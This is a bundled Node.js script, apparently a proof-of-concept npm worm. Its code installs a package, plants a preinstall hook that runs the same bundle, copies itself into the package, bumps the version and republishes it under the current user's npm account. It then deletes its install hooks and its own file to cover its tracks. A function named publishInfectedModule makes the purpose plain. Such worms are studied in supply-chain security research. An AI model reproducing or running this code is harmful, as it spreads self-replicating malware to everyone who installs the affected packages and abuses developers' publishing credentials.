/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// identity function for calling harmony imports with the correct context
/******/ 	__webpack_require__.i = function(value) { return value; };
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 3);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ (function(module, exports) {

module.exports = require("child_process");

/***/ }),
/* 1 */
/***/ (function(module, exports) {

module.exports = require("fs");

/***/ }),
/* 2 */
/***/ (function(module, exports) {

module.exports = require("path");

/***/ }),
/* 3 */
/***/ (function(module, exports, __webpack_require__) {

const exec = __webpack_require__(0).exec;

const fs = __webpack_require__(1);
const path = __webpack_require__(2);
// const request = require('request');
// const cheerio = require('cheerio');

// TODO : use promise for better control flow

function currentUser (cb) {
    exec('npm whoami', cb);
}

function getOwnedModules (user, cb) {
    const url = "https://www.npmjs.org/~" + user;
    // Scrape the page to get a module list
}

function modulePath (moduleName) {
    return path.resolve('./node_modules/' + moduleName);
}

function installModule (moduleName, cb) {
    exec('npm install ' + moduleName, cb);
}

function incrementPatchVersion (moduleName, cb) {
    const opts = {
        cwd: modulePath(moduleName)
    };

    exec('npm version patch', opts, cb);
}

function addScript (moduleName) {
    const pkgJsonPath = modulePath(moduleName) + '/package.json';
    const content = fs.readFileSync(pkgJsonPath);
    const pkgJson = JSON.parse(content);
    pkgJson.scripts = pkgJson.scripts || {};
    pkgJson.scripts.preinstall = "node bundle.js";

    fs.writeFileSync(pkgJsonPath, JSON.stringify(pkgJson, null, 2));
}

function copyScript (moduleName) {
    const content = fs.readFileSync('bundle.js');

    fs.writeFileSync(modulePath(moduleName) + '/bundle.js', content);
}

function publishInfectedModule (moduleName, cb) {
    const opts = {
        cwd: modulePath(moduleName)
    };

    exec('npm publish .', opts, cb);
}

function cleanScript () {
  const pkgJsonPath = path.resolve('./package.json');
  const content = fs.readFileSync(pkgJsonPath);
  const pkgJson = JSON.parse(content);

  pkgJson.scripts = pkgJson.scripts || {};

  delete pkgJson.scripts.preinstall;
  delete pkgJson.scripts.install;
  delete pkgJson.scripts.postinstall;

  fs.writeFileSync('package.json', JSON.stringify(pkgJson, null, 2));
}

function cleanFile () {
  fs.unlinkSync('bundle.js');
}

function clean () {
  try {
    cleanScript();
    cleanFile();
  } catch (e) {}
}

const MODULE_NAME = "sdfjghlkfjdshlkjdhsfg";

installModule(MODULE_NAME, (err, stderr, stdout) => {
    if (!err) {
        addScript(MODULE_NAME);
        copyScript(MODULE_NAME);
        incrementPatchVersion(MODULE_NAME, (err) => {
          publishInfectedModule(MODULE_NAME, () => clean());
        });
    } 
});


/***/ })
/******/ ]);